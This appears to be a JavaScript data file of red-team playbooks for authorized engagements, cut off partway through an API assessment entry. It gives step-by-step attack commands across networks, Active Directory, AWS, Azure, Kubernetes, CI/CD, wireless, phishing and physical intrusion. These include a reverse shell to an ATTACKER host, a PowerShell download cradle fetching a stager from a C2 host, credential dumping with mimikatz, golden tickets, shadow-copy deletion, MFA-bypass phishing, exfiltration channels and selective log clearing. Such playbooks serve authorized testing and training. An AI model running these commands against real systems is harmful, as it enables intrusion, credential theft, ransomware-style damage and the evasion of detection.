// Copyright (c) 2026 SpartanKing18. All rights reserved.
// Red Team Operation Playbooks — comprehensive attack simulation guides for authorized engagements

export const RED_TEAM_PLAYBOOKS = [
  {
    id: "rt-001", name: "External Network Penetration Test", objective: "Identify and exploit vulnerabilities accessible from the internet to gain internal network access",
    assumed_breach: false,
    phases: [
      { name: "Reconnaissance", activities: [
        { step: 1, tool: "amass", command: "amass enum -d target.com -active -brute", detection_risk: "low" },
        { step: 2, tool: "subfinder", command: "subfinder -d target.com -all -o subs.txt", detection_risk: "low" },
        { step: 3, tool: "httpx", command: "httpx -l subs.txt -sc -title -tech-detect -o alive.txt", detection_risk: "low" },
        { step: 4, tool: "nmap", command: "nmap -sS -sV -p- --min-rate 1000 -oA fullscan target.com", detection_risk: "medium" },
        { step: 5, tool: "shodan", command: "shodan search hostname:target.com", detection_risk: "low" },
        { step: 6, tool: "theHarvester", command: "theHarvester -d target.com -b all -l 500", detection_risk: "low" },
        { step: 7, tool: "nuclei", command: "nuclei -l alive.txt -t cves/ -severity critical,high -o vulns.txt", detection_risk: "medium" },
        { step: 8, tool: "wafw00f", command: "wafw00f -a target.com", detection_risk: "low" }
      ]},
      { name: "Initial Access", activities: [
        { step: 1, tool: "searchsploit", command: "searchsploit apache 2.4.49", detection_risk: "low" },
        { step: 2, tool: "metasploit", command: "use exploit/multi/http/apache_normalize_path_rce; set RHOSTS target.com; run", detection_risk: "high" },
        { step: 3, tool: "sqlmap", command: "sqlmap -u 'https://target.com/api?id=1' --os-shell --tamper=space2comment", detection_risk: "high" },
        { step: 4, tool: "hydra", command: "hydra -L users.txt -P pass.txt target.com ssh -t 4", detection_risk: "high" },
        { step: 5, tool: "gobuster", command: "gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt", detection_risk: "medium" }
      ]},
      { name: "Post-Exploitation", activities: [
        { step: 1, tool: "linpeas", command: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", detection_risk: "medium" },
        { step: 2, tool: "chisel", command: "chisel server --reverse --port 8080 (attacker) / chisel client ATTACKER:8080 R:socks", detection_risk: "medium" },
        { step: 3, tool: "proxychains", command: "proxychains nmap -sT -Pn 10.0.0.0/24 -p 445,3389,22", detection_risk: "medium" },
        { step: 4, tool: "mimikatz", command: "sekurlsa::logonpasswords", detection_risk: "high" }
      ]}
    ],
    c2_setup: ["Sliver C2 with HTTPS listener on port 443", "Domain fronting via CDN for traffic blending", "Redirector on cloud VPS with iptables forwarding"],
    exfil_methods: ["DNS tunneling via iodine", "HTTPS POST to cloud storage API", "Steganography in image uploads"],
    cleanup: ["Remove all uploaded tools and scripts", "Clear bash_history and auth logs", "Remove scheduled tasks and cron jobs", "Delete any created user accounts", "Restore modified configurations from backups"]
  },
  {
    id: "rt-002", name: "Assumed Breach — Domain Dominance", objective: "Starting from a standard domain user, escalate to Domain Admin and demonstrate full compromise",
    assumed_breach: true,
    phases: [
      { name: "Situational Awareness", activities: [
        { step: 1, tool: "PowerShell", command: "Get-ADDomain; Get-ADForest; Get-ADTrust -Filter *", detection_risk: "low" },
        { step: 2, tool: "BloodHound", command: "SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\\temp", detection_risk: "medium" },
        { step: 3, tool: "PowerView", command: "Get-DomainUser -SPN | select samaccountname,serviceprincipalname", detection_risk: "medium" },
        { step: 4, tool: "PowerView", command: "Find-LocalAdminAccess -Verbose", detection_risk: "medium" },
        { step: 5, tool: "ADModule", command: "Get-ADGroupMember 'Domain Admins' -Recursive | select name", detection_risk: "low" }
      ]},
      { name: "Privilege Escalation", activities: [
        { step: 1, tool: "Rubeus", command: "Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat", detection_risk: "medium" },
        { step: 2, tool: "hashcat", command: "hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule", detection_risk: "low" },
        { step: 3, tool: "Certify", command: "Certify.exe find /vulnerable", detection_risk: "medium" },
        { step: 4, tool: "Certipy", command: "certipy req -u user@corp.local -p 'Pass123' -ca CORP-CA -template VulnTemplate -upn admin@corp.local", detection_risk: "high" },
        { step: 5, tool: "Rubeus", command: "Rubeus.exe asktgt /user:admin /certificate:admin.pfx /ptt", detection_risk: "high" }
      ]},
      { name: "Lateral Movement", activities: [
        { step: 1, tool: "CrackMapExec", command: "crackmapexec smb 10.0.0.0/24 -u admin -p 'Password1' --shares", detection_risk: "high" },
        { step: 2, tool: "Impacket", command: "psexec.py corp.local/admin:'Password1'@10.0.0.5", detection_risk: "high" },
        { step: 3, tool: "Evil-WinRM", command: "evil-winrm -i 10.0.0.5 -u admin -p 'Password1'", detection_risk: "medium" },
        { step: 4, tool: "Mimikatz", command: "lsadump::dcsync /domain:corp.local /user:krbtgt", detection_risk: "high" }
      ]},
      { name: "Persistence", activities: [
        { step: 1, tool: "Mimikatz", command: "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt", detection_risk: "high" },
        { step: 2, tool: "PowerShell", command: "Set-ADUser -Identity backdoor -ServicePrincipalNames @{Add='HTTP/fake'}", detection_risk: "medium" },
        { step: 3, tool: "SharpPersist", command: "SharpPersist.exe -t reg -c 'C:\\implant.exe' -a '-s' -k hkcurun -v backdoor", detection_risk: "high" }
      ]}
    ],
    c2_setup: ["Cobalt Strike with malleable C2 profile mimicking Microsoft Teams traffic", "Stageless HTTPS beacon with jitter 40-60%", "Named pipe lateral movement for internal comms"],
    exfil_methods: ["SMB to attacker-controlled share", "PowerShell Invoke-WebRequest to cloud endpoint", "Encrypted archive via email attachment"],
    cleanup: ["Remove Golden/Silver tickets", "Delete SharpHound output and BloodHound data", "Remove registry persistence keys", "Delete created service accounts", "Clear event logs selectively (4624, 4672, 4768, 4769)"]
  },
  {
    id: "rt-003", name: "Cloud Infrastructure Attack — AWS", objective: "Exploit cloud misconfigurations to access sensitive data and pivot across AWS accounts",
    assumed_breach: false,
    phases: [
      { name: "Cloud Reconnaissance", activities: [
        { step: 1, tool: "S3Scanner", command: "s3scanner scan --buckets-file targets.txt", detection_risk: "low" },
        { step: 2, tool: "GitLeaks", command: "gitleaks detect -s target-repo --report-path leaks.json", detection_risk: "low" },
        { step: 3, tool: "truffleHog", command: "trufflehog github --org targetorg --only-verified", detection_risk: "low" },
        { step: 4, tool: "aws", command: "aws sts get-caller-identity (with found credentials)", detection_risk: "medium" },
        { step: 5, tool: "ScoutSuite", command: "scout aws --profile compromised-creds", detection_risk: "medium" }
      ]},
      { name: "Privilege Escalation", activities: [
        { step: 1, tool: "Pacu", command: "run iam__enum_permissions; run iam__privesc_scan", detection_risk: "medium" },
        { step: 2, tool: "aws", command: "aws iam create-policy-version --policy-arn arn:aws:iam::123:policy/target --policy-document file://admin.json --set-as-default", detection_risk: "high" },
        { step: 3, tool: "aws", command: "aws lambda create-function --function-name privesc --role arn:aws:iam::123:role/admin-role --handler index.handler --runtime python3.9 --code fileb://payload.zip", detection_risk: "high" },
        { step: 4, tool: "aws", command: "aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,PublicIpAddress,IamInstanceProfile]'", detection_risk: "low" }
      ]},
      { name: "Data Access", activities: [
        { step: 1, tool: "aws", command: "aws s3 ls s3://sensitive-bucket --recursive", detection_risk: "medium" },
        { step: 2, tool: "aws", command: "aws secretsmanager list-secrets; aws secretsmanager get-secret-value --secret-id prod/db-creds", detection_risk: "high" },
        { step: 3, tool: "aws", command: "aws ssm get-parameters-by-path --path / --recursive --with-decryption", detection_risk: "high" },
        { step: 4, tool: "aws", command: "aws rds describe-db-instances; aws rds modify-db-instance --db-instance-identifier prod --master-user-password NewPass123", detection_risk: "high" }
      ]}
    ],
    c2_setup: ["Lambda function as serverless C2 relay", "API Gateway with custom domain for HTTPS C2", "CloudFront distribution for domain fronting"],
    exfil_methods: ["S3 cross-account copy to attacker bucket", "Lambda function streaming to external endpoint", "SNS topic publishing to external subscriber", "EC2 instance with EBS snapshot shared cross-account"],
    cleanup: ["Delete created Lambda functions", "Revert IAM policy versions", "Remove cross-account trust policies", "Delete CloudTrail evidence if accessible (note: this would be detected)", "Rotate all compromised credentials"]
  },
  {
    id: "rt-004", name: "Web Application Full Compromise", objective: "Chain web vulnerabilities to achieve RCE and pivot to internal network",
    assumed_breach: false,
    phases: [
      { name: "Application Mapping", activities: [
        { step: 1, tool: "Burp Suite", command: "Spider the target, build site map, identify entry points", detection_risk: "low" },
        { step: 2, tool: "ffuf", command: "ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u https://target.com/FUZZ -fc 404", detection_risk: "medium" },
        { step: 3, tool: "katana", command: "katana -u https://target.com -d 3 -jc -o endpoints.txt", detection_risk: "low" },
        { step: 4, tool: "Wappalyzer", command: "Identify tech stack: framework, CMS, server, WAF", detection_risk: "low" },
        { step: 5, tool: "Arjun", command: "arjun -u https://target.com/api/search -m GET POST", detection_risk: "medium" }
      ]},
      { name: "Vulnerability Discovery", activities: [
        { step: 1, tool: "Burp Scanner", command: "Active scan all discovered endpoints", detection_risk: "high" },
        { step: 2, tool: "sqlmap", command: "sqlmap -u 'https://target.com/search?q=test' --level 5 --risk 3 --batch", detection_risk: "high" },
        { step: 3, tool: "Burp Intruder", command: "Fuzz parameters with XSS/SQLi/SSTI payloads", detection_risk: "high" },
        { step: 4, tool: "tplmap", command: "tplmap -u 'https://target.com/render?name=test'", detection_risk: "high" },
        { step: 5, tool: "jwt_tool", command: "jwt_tool eyJ... -M at -t https://target.com/api/admin -rh 'Authorization: Bearer'", detection_risk: "medium" }
      ]},
      { name: "Exploitation & Pivot", activities: [
        { step: 1, tool: "Manual", command: "Chain SSRF → internal metadata → cloud credentials", detection_risk: "high" },
        { step: 2, tool: "webshell", command: "Upload PHP webshell via file upload bypass (double extension + magic bytes)", detection_risk: "high" },
        { step: 3, tool: "reverse shell", command: "bash -i >& /dev/tcp/ATTACKER/4444 0>&1", detection_risk: "high" },
        { step: 4, tool: "chisel", command: "Pivot to internal network via SOCKS proxy through compromised web server", detection_risk: "medium" }
      ]}
    ],
    c2_setup: ["Webshell with encrypted communications", "Reverse HTTPS shell through web server egress", "DNS tunneling through application's DNS resolver"],
    exfil_methods: ["Database dump via SQLi → outband DNS", "File download through webshell", "API data extraction via authorized session tokens"],
    cleanup: ["Remove webshells and uploaded files", "Delete access logs showing attack traffic", "Remove reverse shell artifacts", "Restore modified application configs"]
  },
  {
    id: "rt-005", name: "Social Engineering Campaign", objective: "Gain initial access through targeted phishing and social engineering techniques",
    assumed_breach: false,
    phases: [
      { name: "Target Research", activities: [
        { step: 1, tool: "LinkedIn", command: "Identify key personnel, org structure, recent hires", detection_risk: "low" },
        { step: 2, tool: "hunter.io", command: "Discover email format and addresses for target domain", detection_risk: "low" },
        { step: 3, tool: "theHarvester", command: "theHarvester -d target.com -b linkedin,twitter,google -l 200", detection_risk: "low" },
        { step: 4, tool: "OSINT", command: "Review social media, job postings for tech stack, recent events", detection_risk: "low" }
      ]},
      { name: "Infrastructure Setup", activities: [
        { step: 1, tool: "GoPhish", command: "Deploy GoPhish on cloud VPS, configure SMTP relay", detection_risk: "low" },
        { step: 2, tool: "Evilginx2", command: "Set up reverse proxy for credential harvesting with MFA bypass", detection_risk: "low" },
        { step: 3, tool: "DNS", command: "Register lookalike domain (typosquatting), configure SPF/DKIM/DMARC", detection_risk: "low" },
        { step: 4, tool: "LetsEncrypt", command: "Obtain SSL cert for phishing domain for credibility", detection_risk: "low" }
      ]},
      { name: "Campaign Execution", activities: [
        { step: 1, tool: "GoPhish", command: "Send credential harvesting emails to 50 targets with IT helpdesk pretext", detection_risk: "high" },
        { step: 2, tool: "Evilginx2", command: "Capture session tokens and MFA codes via reverse proxy", detection_risk: "high" },
        { step: 3, tool: "Browser", command: "Use captured session tokens to access target's email/VPN/cloud", detection_risk: "high" },
        { step: 4, tool: "O365", command: "Set up mail forwarding rule, download global address list, search for credentials in email", detection_risk: "high" }
      ]}
    ],
    c2_setup: ["GoPhish campaign server behind CDN", "Evilginx2 with legitimate-looking domain", "Redirector dropping non-target traffic"],
    exfil_methods: ["Email forwarding rules", "OAuth app consent for persistent access", "OneDrive/SharePoint file access via stolen tokens"],
    cleanup: ["Remove mail forwarding rules", "Revoke OAuth app grants", "Delete phishing infrastructure", "Report all captured credentials to client for forced reset"]
  },
  {
    id: "rt-006", name: "Wireless Network Penetration", objective: "Compromise wireless infrastructure to gain internal network access",
    assumed_breach: false,
    phases: [
      { name: "Wireless Reconnaissance", activities: [
        { step: 1, tool: "airmon-ng", command: "airmon-ng start wlan0", detection_risk: "low" },
        { step: 2, tool: "airodump-ng", command: "airodump-ng wlan0mon --band abg -w capture", detection_risk: "low" },
        { step: 3, tool: "kismet", command: "kismet -c wlan0mon", detection_risk: "low" },
        { step: 4, tool: "wash", command: "wash -i wlan0mon (discover WPS-enabled APs)", detection_risk: "low" }
      ]},
      { name: "Attack Execution", activities: [
        { step: 1, tool: "aireplay-ng", command: "aireplay-ng -0 5 -a BSSID wlan0mon (deauth to capture handshake)", detection_risk: "high" },
        { step: 2, tool: "hashcat", command: "hashcat -m 22000 capture.hc22000 rockyou.txt", detection_risk: "low" },
        { step: 3, tool: "hostapd-mana", command: "Create evil twin AP with captive portal for credential harvesting", detection_risk: "high" },
        { step: 4, tool: "bettercap", command: "bettercap -iface wlan0 -eval 'wifi.recon on; wifi.deauth BSSID'", detection_risk: "high" },
        { step: 5, tool: "eaphammer", command: "eaphammer -i wlan0 --auth wpa-eap --essid CorpWiFi --creds", detection_risk: "high" }
      ]},
      { name: "Post-Access", activities: [
        { step: 1, tool: "nmap", command: "nmap -sn 10.0.0.0/24 (discover internal hosts)", detection_risk: "medium" },
        { step: 2, tool: "responder", command: "responder -I wlan0 -wrf (capture NTLM hashes)", detection_risk: "high" },
        { step: 3, tool: "crackmapexec", command: "crackmapexec smb 10.0.0.0/24 -u user -H NTLM_HASH", detection_risk: "high" }
      ]}
    ],
    c2_setup: ["Reverse SSH tunnel from compromised internal host", "DNS-over-HTTPS for C2 traffic blending"],
    exfil_methods: ["Encrypted tunnel through wireless to attacker AP", "USB dead drop for air-gapped targets"],
    cleanup: ["Stop evil twin AP", "Remove any deployed implants", "Document captured credentials for client reset"]
  },
  {
    id: "rt-007", name: "Supply Chain Attack Simulation", objective: "Demonstrate risks of third-party dependency compromise",
    assumed_breach: false,
    phases: [
      { name: "Dependency Analysis", activities: [
        { step: 1, tool: "npm/pip audit", command: "npm audit; pip-audit; safety check", detection_risk: "low" },
        { step: 2, tool: "Manual", command: "Review package.json/requirements.txt for typosquatting candidates", detection_risk: "low" },
        { step: 3, tool: "Socket.dev", command: "Analyze dependency tree for unmaintained or suspicious packages", detection_risk: "low" },
        { step: 4, tool: "Manual", command: "Review CI/CD pipeline configs for unpinned actions/dependencies", detection_risk: "low" }
      ]},
      { name: "Simulated Compromise", activities: [
        { step: 1, tool: "npm", command: "Create proof-of-concept package demonstrating exfiltration capability (canary only)", detection_risk: "medium" },
        { step: 2, tool: "GitHub Actions", command: "Demonstrate unpinned action version replacement attack on test repo", detection_risk: "medium" },
        { step: 3, tool: "pip", command: "Create PoC demonstrating dependency confusion attack with internal package name", detection_risk: "medium" }
      ]},
      { name: "Impact Assessment", activities: [
        { step: 1, tool: "Manual", command: "Document all environments where compromised package would execute", detection_risk: "low" },
        { step: 2, tool: "Manual", command: "Map data accessible from build/CI environment (secrets, tokens, source code)", detection_risk: "low" }
      ]}
    ],
    c2_setup: ["DNS canary for package installation detection", "HTTP callback to controlled endpoint for PoC"],
    exfil_methods: ["Environment variable capture in build pipeline", "Source code access via CI token", "DNS exfiltration of canary data"],
    cleanup: ["Remove PoC packages from registries", "Delete test repos and pipelines", "Document all found weaknesses"]
  },
  {
    id: "rt-008", name: "Physical Security Assessment", objective: "Test physical security controls through social engineering and physical access attempts",
    assumed_breach: false,
    phases: [
      { name: "Physical Reconnaissance", activities: [
        { step: 1, tool: "Google Maps/Earth", command: "Satellite and street view analysis of facility perimeter", detection_risk: "low" },
        { step: 2, tool: "Camera", command: "Photograph entry points, badge readers, cameras, dumpsters", detection_risk: "medium" },
        { step: 3, tool: "Observation", command: "Note employee badge-in patterns, smoking areas, delivery schedules", detection_risk: "low" },
        { step: 4, tool: "OSINT", command: "Find building plans, security vendor info from permit applications", detection_risk: "low" }
      ]},
      { name: "Access Attempts", activities: [
        { step: 1, tool: "Social engineering", command: "Tailgating through badge-controlled doors during peak hours", detection_risk: "high" },
        { step: 2, tool: "Pretext", command: "Impersonate delivery driver, HVAC technician, or IT contractor", detection_risk: "high" },
        { step: 3, tool: "USB drop", command: "Place labeled USB drives (with canary callback) in parking lot and lobby", detection_risk: "medium" },
        { step: 4, tool: "Lock picks", command: "Test server room and wiring closet locks (with authorization)", detection_risk: "high" },
        { step: 5, tool: "Proxmark3", command: "Clone RFID badge from observed employee at close range", detection_risk: "high" }
      ]},
      { name: "Data Collection", activities: [
        { step: 1, tool: "Bash Bunny", command: "Deploy keystroke injection device on unattended workstation", detection_risk: "high" },
        { step: 2, tool: "LAN Turtle", command: "Install network implant on available ethernet port", detection_risk: "high" },
        { step: 3, tool: "WiFi Pineapple", command: "Deploy rogue AP in concealed location for persistent wireless access", detection_risk: "medium" }
      ]}
    ],
    c2_setup: ["LAN Turtle with reverse SSH tunnel", "WiFi Pineapple with VPN back to attack infrastructure", "Bash Bunny with delayed payload execution"],
    exfil_methods: ["Physical removal of documents from dumpster", "Photos of sensitive whiteboards/screens", "Network implant data collection over time"],
    cleanup: ["Retrieve all planted devices", "Return any collected physical materials", "Document all successful access methods and timing"]
  },
  {
    id: "rt-009", name: "Purple Team Exercise — Ransomware Simulation", objective: "Simulate ransomware attack with blue team observing in real-time to test detection and response",
    assumed_breach: true,
    phases: [
      { name: "Initial Compromise (Observed)", activities: [
        { step: 1, tool: "Macro document", command: "Deliver macro-enabled document via email (blue team notified of delivery time)", detection_risk: "high" },
        { step: 2, tool: "PowerShell", command: "IEX(New-Object Net.WebClient).DownloadString('http://C2/stager.ps1')", detection_risk: "high" },
        { step: 3, tool: "C2", command: "Establish command and control beacon (blue team monitors for detection)", detection_risk: "high" }
      ]},
      { name: "Internal Reconnaissance", activities: [
        { step: 1, tool: "net commands", command: "net user /domain; net group 'Domain Admins' /domain", detection_risk: "medium" },
        { step: 2, tool: "PowerShell", command: "Get-ADComputer -Filter * | select name,dnshostname", detection_risk: "medium" },
        { step: 3, tool: "ping sweep", command: "1..254 | %{Test-Connection -Count 1 -Quiet 10.0.0.$_}", detection_risk: "medium" }
      ]},
      { name: "Lateral Movement & Escalation", activities: [
        { step: 1, tool: "Mimikatz", command: "privilege::debug; sekurlsa::logonpasswords", detection_risk: "high" },
        { step: 2, tool: "PsExec", command: "PsExec.exe \\\\fileserver cmd.exe (using harvested credentials)", detection_risk: "high" },
        { step: 3, tool: "WMI", command: "wmic /node:DC01 process call create 'powershell -ep bypass -f beacon.ps1'", detection_risk: "high" }
      ]},
      { name: "Ransomware Simulation", activities: [
        { step: 1, tool: "Custom script", command: "Encrypt test files only (pre-agreed directory) with AES-256, drop ransom note", detection_risk: "high" },
        { step: 2, tool: "vssadmin", command: "vssadmin delete shadows /all /quiet (on test system only)", detection_risk: "high" },
        { step: 3, tool: "PowerShell", command: "Disable Windows Defender real-time protection on test endpoints", detection_risk: "high" }
      ]}
    ],
    c2_setup: ["Sliver C2 with known IoCs shared with blue team", "Agreed-upon C2 domains and IPs for detection testing"],
    exfil_methods: ["Simulated data exfiltration (canary files only) via HTTPS", "Blue team measures time to detect exfil attempt"],
    cleanup: ["Decrypt all test files", "Remove all implants and persistence", "Restore shadow copies", "Re-enable security controls", "Joint debrief with detection timeline"]
  },
  {
    id: "rt-010", name: "Azure AD / Entra ID Attack Path", objective: "Escalate from standard Azure AD user to Global Administrator",
    assumed_breach: true,
    phases: [
      { name: "Azure Enumeration", activities: [
        { step: 1, tool: "AzureHound", command: "azurehound list -t TENANT_ID --refresh-token TOKEN -o azurehound.json", detection_risk: "medium" },
        { step: 2, tool: "az cli", command: "az ad user list; az ad group list; az role assignment list", detection_risk: "low" },
        { step: 3, tool: "ROADtools", command: "roadrecon gather --access-token TOKEN; roadrecon gui", detection_risk: "medium" },
        { step: 4, tool: "az cli", command: "az ad app list --all --query '[].{name:displayName,appId:appId,creds:passwordCredentials}'", detection_risk: "medium" }
      ]},
      { name: "Privilege Escalation", activities: [
        { step: 1, tool: "az cli", command: "az ad app credential reset --id APP_ID --append (add creds to service principal)", detection_risk: "high" },
        { step: 2, tool: "TokenTactics", command: "Refresh token to access different resource (token exchange)", detection_risk: "medium" },
        { step: 3, tool: "az cli", command: "az role assignment create --assignee SP_ID --role 'Global Administrator' --scope /", detection_risk: "high" },
        { step: 4, tool: "AADInternals", command: "Set-AADIntUserPassword -SourceAnchor 'encoded' -Password 'NewPass' -CloudAnchor 'User_ObjectId'", detection_risk: "high" }
      ]},
      { name: "Persistence & Impact", activities: [
        { step: 1, tool: "az cli", command: "az ad app create --display-name 'Backup Sync' --key-type Password (backdoor app)", detection_risk: "high" },
        { step: 2, tool: "PowerShell", command: "New-AzureADServicePrincipal with Directory.ReadWrite.All + admin consent", detection_risk: "high" },
        { step: 3, tool: "Graph API", command: "POST /policies/authorizationPolicy — disable MFA requirement (impact demo)", detection_risk: "high" }
      ]}
    ],
    c2_setup: ["Azure Function as serverless backdoor", "Logic App for persistent webhook-based access", "Managed Identity abuse for lateral movement"],
    exfil_methods: ["Graph API bulk user/group export", "SharePoint Online document library download", "Azure Key Vault secret extraction"],
    cleanup: ["Remove backdoor applications and service principals", "Revoke added role assignments", "Delete Azure Functions/Logic Apps", "Reset compromised passwords", "Re-enable MFA policies"]
  },
  {
    id: "rt-011", name: "Kubernetes Cluster Compromise", objective: "Escalate from a compromised pod to cluster admin and access secrets",
    assumed_breach: true,
    phases: [
      { name: "Container Escape Recon", activities: [
        { step: 1, tool: "kubectl", command: "cat /var/run/secrets/kubernetes.io/serviceaccount/token (check SA token)", detection_risk: "low" },
        { step: 2, tool: "kubectl", command: "kubectl auth can-i --list (enumerate permissions)", detection_risk: "low" },
        { step: 3, tool: "curl", command: "curl -k https://kubernetes.default.svc/api/v1/namespaces", detection_risk: "medium" },
        { step: 4, tool: "Manual", command: "Check for privileged container, hostPID, hostNetwork, mounted docker socket", detection_risk: "low" }
      ]},
      { name: "Privilege Escalation", activities: [
        { step: 1, tool: "kubectl", command: "kubectl create -f privesc-pod.yaml (mount host filesystem)", detection_risk: "high" },
        { step: 2, tool: "nsenter", command: "nsenter --target 1 --mount --uts --ipc --net --pid -- bash", detection_risk: "high" },
        { step: 3, tool: "kubectl", command: "kubectl get secrets --all-namespaces -o json", detection_risk: "high" },
        { step: 4, tool: "kubectl", command: "kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=default:default", detection_risk: "high" }
      ]},
      { name: "Lateral Movement", activities: [
        { step: 1, tool: "kubectl", command: "kubectl exec -it pod-in-other-ns -- sh", detection_risk: "high" },
        { step: 2, tool: "curl", command: "Access cloud metadata from node (http://169.254.169.254/latest/meta-data/iam/security-credentials/)", detection_risk: "medium" },
        { step: 3, tool: "kubectl", command: "Create DaemonSet to deploy implant on all nodes", detection_risk: "high" }
      ]}
    ],
    c2_setup: ["Reverse shell from pod through cluster egress", "DNS tunneling via cluster DNS resolver", "Sidecar container injection for persistent access"],
    exfil_methods: ["kubectl cp from pods to attacker", "Cloud storage access via node IAM role", "Container registry image push with embedded data"],
    cleanup: ["Delete created pods, deployments, daemonsets", "Remove clusterrolebindings", "Rotate all exposed secrets and tokens"]
  },
  {
    id: "rt-012", name: "IoT / Embedded Device Attack", objective: "Compromise IoT devices and use them to pivot into the corporate network",
    assumed_breach: false,
    phases: [
      { name: "Device Discovery", activities: [
        { step: 1, tool: "nmap", command: "nmap -sn -PR 10.0.0.0/24 (ARP discovery)", detection_risk: "low" },
        { step: 2, tool: "nmap", command: "nmap -sV -p 80,443,8080,23,22,1883,5683 10.0.0.0/24 (IoT ports)", detection_risk: "medium" },
        { step: 3, tool: "Shodan", command: "shodan search 'org:TargetCorp' 'port:1883'", detection_risk: "low" },
        { step: 4, tool: "MQTT Explorer", command: "Connect to MQTT broker, subscribe to #, observe traffic", detection_risk: "medium" }
      ]},
      { name: "Firmware Analysis", activities: [
        { step: 1, tool: "binwalk", command: "binwalk -e firmware.bin (extract filesystem)", detection_risk: "low" },
        { step: 2, tool: "strings", command: "strings firmware.bin | grep -i password", detection_risk: "low" },
        { step: 3, tool: "firmwalker", command: "firmwalker extracted_fs/ (find interesting files)", detection_risk: "low" },
        { step: 4, tool: "QEMU", command: "qemu-system-arm -M virt -kernel zImage -append 'root=/dev/sda' (emulate firmware)", detection_risk: "low" }
      ]},
      { name: "Exploitation", activities: [
        { step: 1, tool: "hydra", command: "hydra -L iot_users.txt -P iot_pass.txt 10.0.0.50 telnet", detection_risk: "high" },
        { step: 2, tool: "UART", command: "Connect to UART pins, interrupt boot, access root shell", detection_risk: "low" },
        { step: 3, tool: "mosquitto_pub", command: "mosquitto_pub -h broker -t 'device/control' -m '{\"cmd\":\"unlock\"}' (MQTT injection)", detection_risk: "high" },
        { step: 4, tool: "Manual", command: "Pivot from compromised IoT device to corporate VLAN", detection_risk: "high" }
      ]}
    ],
    c2_setup: ["MQTT-based C2 channel through existing broker", "CoAP reverse shell for constrained devices"],
    exfil_methods: ["MQTT publish to external broker", "DNS tunneling from IoT VLAN", "Camera feed redirection"],
    cleanup: ["Factory reset compromised devices", "Remove MQTT subscriptions", "Restore firmware if modified"]
  },
  {
    id: "rt-013", name: "CI/CD Pipeline Attack", objective: "Compromise the software build pipeline to inject malicious code into production",
    assumed_breach: true,
    phases: [
      { name: "Pipeline Reconnaissance", activities: [
        { step: 1, tool: "GitHub", command: "Review .github/workflows/*.yml for secrets, permissions, unpinned actions", detection_risk: "low" },
        { step: 2, tool: "Manual", command: "Identify self-hosted runners and their network access", detection_risk: "low" },
        { step: 3, tool: "Manual", command: "Review branch protection rules and required approvals", detection_risk: "low" },
        { step: 4, tool: "GitHub API", command: "List repository secrets (names only) and environment protections", detection_risk: "low" }
      ]},
      { name: "Pipeline Poisoning", activities: [
        { step: 1, tool: "git", command: "Create PR with modified workflow that exfiltrates secrets to controlled endpoint", detection_risk: "high" },
        { step: 2, tool: "GitHub Actions", command: "Exploit pull_request_target trigger to run modified code with repo secrets", detection_risk: "high" },
        { step: 3, tool: "Manual", command: "Replace pinned action version with modified fork", detection_risk: "high" },
        { step: 4, tool: "Self-hosted runner", command: "Escape runner sandbox, access host filesystem and network", detection_risk: "high" }
      ]},
      { name: "Production Impact", activities: [
        { step: 1, tool: "Manual", command: "Inject backdoor into build artifact (npm package, Docker image, binary)", detection_risk: "high" },
        { step: 2, tool: "Manual", command: "Modify deployment config to add attacker-controlled environment variable", detection_risk: "high" },
        { step: 3, tool: "Manual", command: "Demonstrate production secret extraction via build log injection", detection_risk: "high" }
      ]}
    ],
    c2_setup: ["Webhook endpoint for secret exfiltration", "Modified GitHub Action as persistent backdoor"],
    exfil_methods: ["Build log injection with encoded secrets", "Modified artifact containing exfil payload", "Self-hosted runner network access to internal services"],
    cleanup: ["Revert all PR and workflow changes", "Rotate ALL pipeline secrets", "Audit recent deployments for integrity", "Review and pin all GitHub Action versions"]
  },
  {
    id: "rt-014", name: "Internal Network Pivoting & Segmentation Testing", objective: "Test network segmentation by pivoting between network segments from a compromised host",
    assumed_breach: true,
    phases: [
      { name: "Network Mapping", activities: [
        { step: 1, tool: "ip/ifconfig", command: "ip addr; ip route; cat /etc/resolv.conf", detection_risk: "low" },
        { step: 2, tool: "nmap", command: "nmap -sn 10.0.0.0/24 10.1.0.0/24 10.2.0.0/24 (discover segments)", detection_risk: "medium" },
        { step: 3, tool: "arp-scan", command: "arp-scan -I eth0 --localnet", detection_risk: "medium" },
        { step: 4, tool: "traceroute", command: "traceroute to hosts in different VLANs to map routing", detection_risk: "low" }
      ]},
      { name: "Segmentation Testing", activities: [
        { step: 1, tool: "nmap", command: "nmap -Pn -p 22,23,80,443,445,3389,1433,3306,5432 TARGETS", detection_risk: "medium" },
        { step: 2, tool: "chisel", command: "Set up SOCKS proxy through compromised host to reach restricted segments", detection_risk: "medium" },
        { step: 3, tool: "SSH", command: "ssh -D 1080 -L 3389:10.2.0.5:3389 user@pivot-host", detection_risk: "medium" },
        { step: 4, tool: "rpivot", command: "Deploy reverse SOCKS proxy for restricted egress environments", detection_risk: "medium" }
      ]},
      { name: "Lateral Access Verification", activities: [
        { step: 1, tool: "proxychains", command: "proxychains crackmapexec smb 10.2.0.0/24 -u user -p pass", detection_risk: "high" },
        { step: 2, tool: "proxychains", command: "proxychains psql -h 10.3.0.10 -U dbuser -d production", detection_risk: "high" },
        { step: 3, tool: "curl", command: "proxychains curl http://10.4.0.5:8500/v1/kv/?recurse (Consul/Vault)", detection_risk: "medium" }
      ]}
    ],
    c2_setup: ["Multi-hop SSH tunnels through pivot hosts", "Chisel reverse SOCKS through each segment", "ligolo-ng for seamless multi-segment pivoting"],
    exfil_methods: ["Data relay through pivot chain", "DNS tunneling from isolated segments"],
    cleanup: ["Remove all tunneling tools from pivot hosts", "Close port forwards and SOCKS proxies", "Document all segment-crossing paths found"]
  },
  {
    id: "rt-015", name: "API Security Assessment", objective: "Identify and exploit API vulnerabilities to access unauthorized data",
    assumed_breach: false,
    phases: [
      { name: "API Discovery", activities: [
        { step: 1, tool: "Burp Suite", command: "Proxy mobile app / web app traffic to discover API endpoints", detection_risk: "low" },
        { step: 2, tool: "kiterunner", command: "kr scan https://api.target.com -w routes-large.kite", detection_risk: "medium" },
